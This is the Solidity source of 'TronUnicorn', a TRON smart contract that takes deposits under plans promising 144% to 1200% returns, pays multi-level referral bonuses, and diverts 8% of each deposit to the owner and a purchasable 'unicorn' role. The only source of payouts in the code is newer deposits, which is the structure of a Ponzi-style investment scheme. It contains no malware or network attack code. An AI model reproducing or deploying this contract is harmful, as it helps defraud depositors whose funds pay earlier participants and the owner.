//SourceUnit: TronUnicorn.sol

pragma solidity 0.4.25;

contract TronUnicorn {
    using SafeMath for uint256;

    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }

    address public owner;

    address public unicorn;
    uint256 public unicorn_price;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    uint256 public releaseTime = 1598104800;

    uint8[] public ref_bonuses;

    Tarif[] public tarifs;
    mapping(address => Player) public players;
    mapping(uint8 => address) public last_deposits;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event NewUnicorn(address indexed addr, uint256 new_price);

    constructor() public {
        owner = msg.sender;
        unicorn = msg.sender;

        unicorn_price = 2500000000;

        tarifs.push(Tarif(300, 1200));
        tarifs.push(Tarif(32, 192));
        tarifs.push(Tarif(18, 144));

        ref_bonuses.push(50);
        ref_bonuses.push(25);
        ref_bonuses.push(10);

        last_deposits[0] = owner;
        last_deposits[1] = owner;
        last_deposits[2] = owner;
        last_deposits[3] = owner;
        last_deposits[4] = owner;
        last_deposits[5] = owner;
        last_deposits[6] = owner;
        last_deposits[7] = owner;
        last_deposits[8] = owner;
        last_deposits[9] = owner;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;

            uint256 bonus = _amount * ref_bonuses[i] / 1000;

            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0)) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }
            else {
                players[_addr].direct_bonus += _amount / 200;
                direct_bonus += _amount / 200;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 200);

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }

    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 1e7, "Zero amount");
        require(msg.value >= 25000000, "Minimal deposit is 25 TRX");
        require(now >= releaseTime, "not open yet");
        Player storage player = players[msg.sender];

        require(player.deposits.length < 150, "Max 150 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        unicorn.transfer(msg.value.mul(1).div(100));
        owner.transfer(msg.value.mul(7).div(100));

        if(msg.value >= 100000000){
            prependDeposit(msg.sender);
        }

        emit NewDeposit(msg.sender, msg.value, _tarif);
    }

    function withdraw() payable external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        msg.sender.transfer(amount.mul(90).div(100));
        players[last_deposits[0]].direct_bonus += amount.mul(1).div(100);
        players[last_deposits[1]].direct_bonus += amount.mul(1).div(100);
        players[last_deposits[2]].direct_bonus += amount.mul(1).div(100);
        players[last_deposits[3]].direct_bonus += amount.mul(1).div(100);
        players[last_deposits[4]].direct_bonus += amount.mul(1).div(100);
        players[last_deposits[5]].direct_bonus += amount.mul(1).div(100);
        players[last_deposits[6]].direct_bonus += amount.mul(1).div(100);
        players[last_deposits[7]].direct_bonus += amount.mul(1).div(100);
        players[last_deposits[8]].direct_bonus += amount.mul(1).div(100);
        players[last_deposits[9]].direct_bonus += amount.mul(1).div(100);

        emit Withdraw(msg.sender, amount);
    }

    function getUnicorn() payable external {
        require(msg.value >= 1e7, "Zero amount");
        require(msg.value >= unicorn_price, "Not enough TRX");

        unicorn.transfer(unicorn_price.div(120).mul(100));
        owner.transfer(unicorn_price.div(120).mul(20));

        unicorn_price = unicorn_price.div(100).mul(120);
        unicorn = msg.sender;

        emit NewUnicorn(msg.sender, unicorn_price);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }


    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_bonus, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus, address _unicorn, uint256 _unicorn_price) {
        return (invested, withdrawn, direct_bonus, match_bonus, unicorn, unicorn_price);
    }

    function investmentsInfo(address _addr) view external returns(uint8[] memory ids, uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];

        uint8[] memory _ids = new uint8[](player.deposits.length);
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          Deposit storage dep = player.deposits[i];
          Tarif storage tarif = tarifs[dep.tarif];

          _ids[i] = dep.tarif;
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + tarif.life_days * 86400;
        }

        return (
          _ids,
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }

    function seperatePayoutOf(address _addr) view external returns(uint256[] memory withdrawable) {
        Player storage player = players[_addr];
        uint256[] memory values = new uint256[](player.deposits.length);
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                values[i] = dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return values;
    }

    function prependDeposit(address _addr) private {
        for(uint8 i = 9; i > 0; i--){
            last_deposits[i] = last_deposits[i-1];
        }
        last_deposits[0] = _addr;
    }
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}